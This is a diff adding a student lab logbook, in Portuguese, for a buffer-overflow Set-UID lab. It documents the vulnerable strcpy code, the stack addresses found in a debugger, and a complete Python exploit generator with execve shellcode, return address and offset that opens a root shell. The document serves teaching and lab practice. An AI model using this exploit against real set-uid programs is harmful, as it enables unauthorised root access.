@@ -1,4 +1,151 @@
 # LOGBOOK5 - Buffer-Overflow Attack Lab - Set-UID Version
+## Task1
+>When we compile the program using the -m32 flag, the 32-bit version will be used; without this flag, the 64-bit version will be used. Using the provided Makefile, you can compile the code by typing make. Two binaries will be created, a32.out (32-bit) and a64.out (64-bit). Run them and describe your observations.
+<div align="justify">
+<p> Após termos compilado o programa 'call_shellcode.c' utilizando o comando 'make', verificamos que foram criados dois ficheiros binários, um de 32 bits e outro de 64 bits (a32.out e a64.out). Após executar cada um dos dois ficheiros, concluimos que ambos lançavam uma shell sem previlégios de root, tal como era suposto.</p>
+![Alt text](uploads/logbook5P1.png)
+![Alt text](uploads/logbook5P2.png)
+</div>
+
+## Task2
+>Understanding the Vulnerable Program
+<div <div align="justify">
+<p> Nesta tarefa, foi nos apresentado o código do programa 'stack.c'. Com este, conseguimos perceber que a função 'strcpy()', função que como mencionado, não verifica limites, é utilizada para copiar o conteúdo de um array de tamanho até 517 caracteres para um buffer de tamanho igual a BUF_SIZE (neste caso: BUF_SIZE = 100). Concluimos então que existe a possibilidade de um utilizador se aproveitar deste buffer overflow de forma a executar código malicioso.</p>
+<p>
+Além disso, nesta tarefa é nos pedido para compilar o programa utilizando o comando 'gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c' e de seguida alterar as permissões do ficheiro para 'set-uid' utilizando o comando 'sudo chown root stack; sudo chmod 4755 stack'. Com isto, considerando que o programa passou a ser 'root-owned', um utilizador pode aproveitar-se da vulnerabilidade mencionada no parágrafo anterior e abrir uma 'root shell'.</p>
+Ficheiros gerados:
+![Alt text](uploads/logbook5P3.png)
+</div>
+
+## Task3
+>Exploiting the Vulnerability
+### Task3.1 - Investigating the Stack Layout
+<div align="justify">
+<p> Nesta tarefa foi nos pedido para primeiramente criar um ficheiro 'badfile'. Após isso, tivemos que executar o programa stack-L1 em modo debug de forma a descobrir o endereço do buffer e o valor do ebp. Assim, obtivemos os seguintes resultados:</p>
+</div>
+
+- valor do ebp: 0xffffca68
+- endereço do buffer: 0xffffc9fc
+
+![Alt text](uploads/logbook5P4.png)
+
+### Task3.2 - Launching the Attack
+<div align="justify">
+<p> Após a tarefa anterior, foi nos pedido que alterassemos um script python de modo a conseguirmos correr o ataque. O código inalterado era o seguinte:<p>
+</div>
+
+```Python
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+
+shellcode= (
+
+  "\x90\x90\x90\x90"  
+
+  "\x90\x90\x90\x90"  
+
+).encode('latin-1')
+
+# Fill the content with NOP's
+
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+
+# Put the shellcode somewhere in the payload
+start = 0               # Change this number 
+content[start:start + len(shellcode)] = shellcode
+# Decide the return address value 
+# and put it somewhere in the payload
+ret = 0x00           # Change this number 
+offset = 0              # Change this number 
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+
+##################################################################
+# Write the content to a file
+with open('badfile', 'wb') as f:
+
+  f.write(content)
+```
+
+<div align="justify">
+<p> Com este código, conseguimos perceber que inicialmente temos de alterar o shellcode para um que nos permita abrir uma shell. Para isso, utilizamos o shellcode que nos foi fornecido na task1:</p>
+</div>
+
+```Python
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
+```
+
+<div align="justify">
+<p> De seguida, tivemos de alterar o valor de 'start' de forma a colocar o shellcode no final da stack. Com isto decidimos alterar o 'start' para:</p>
+</div>
+
+```Python
+start = 517 - len(shellcode)
+```
+
+<div align="justify">
+<p>Para calcular o offset basta calcular a diferença entre o valor do 'epb' e o endereço de memória do buffer e somar os 4 bytes de distância para o return adress.
+<p> Após isto, tivemos de alterar o valor do 'return adress' ('ret'). Como sabiamos que o 'return adress' teria que retornar para um dos 'NOP' na stack, e que devido as diferenças nos endereços de memória ao executar o program em modo de debug, somar ao valor do 'epb' 8 bytes (que seria o primeiro 'NOP' seguinte) podia causar erros na execução do programa. Tendo isso em mente, somamos ao valor do 'epb' um valor significativo como 110. Assim: </p> 
+</div>
+
+```Python
+ret = 0xffffca68 + 110 = 0xffffcad6
+offset = 0xffffca68 - 0xffffc9fc + 4 = 112
+```
+
+<p> Com isto, o código final ficou da seguinte forma:</p>
+
+```Python
+#!/usr/bin/python3
+
+import sys
+
+# Replace the content with the actual shellcode
+
+shellcode= (
+
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"  
+
+).encode('latin-1')
+
+# Fill the content with NOP's
+
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+
+# Put the shellcode somewhere in the payload
+
+start = 517 - len(shellcode)               # Change this number 
+
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+
+# and put it somewhere in the payload
+
+ret = 0xffffcad6           # Change this number 
+
+offset = 112              # Change this number 
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+
+##################################################################
+
+# Write the content to a file
+
+with open('badfile', 'wb') as f:
+
+  f.write(content)
+```
+
 # LOGBOOK5 - CTF
 ## Desaio 1
 >Existe algum ficheiro que é aberto e lido pelo programa?
